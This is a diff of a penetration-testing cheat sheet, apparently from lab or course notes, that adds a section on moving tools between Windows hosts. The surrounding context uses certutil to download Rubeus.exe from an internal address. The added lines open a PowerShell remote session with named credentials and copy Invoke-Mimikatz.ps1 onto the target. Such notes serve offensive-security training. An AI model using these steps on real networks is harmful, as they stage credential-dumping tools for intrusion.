@@ -81,6 +81,16 @@ certutil.exe -urlcache -f http://192.168.50.48/Rubeus.exe C:\users\hitman\Rubeus
 
 &nbsp;
 
+**[+] Transfer files using powershell session (PSSesion)**
+
+```powershell
+$sess = New-PSSession -ComputerName ufc-webprod -Credential usfun\pastudent1337
+Copy-Item -Path Invoke-Mimikatz.ps1 -Destination C:\users\public\Invoke-Mimikatz.ps1 -ToSession $sess
+// You can use too -FromSession :D
+```
+
+&nbsp;
+
 **[+] Transfer files using rdesktop tool (Available in Kali Linux)**
 
 ```
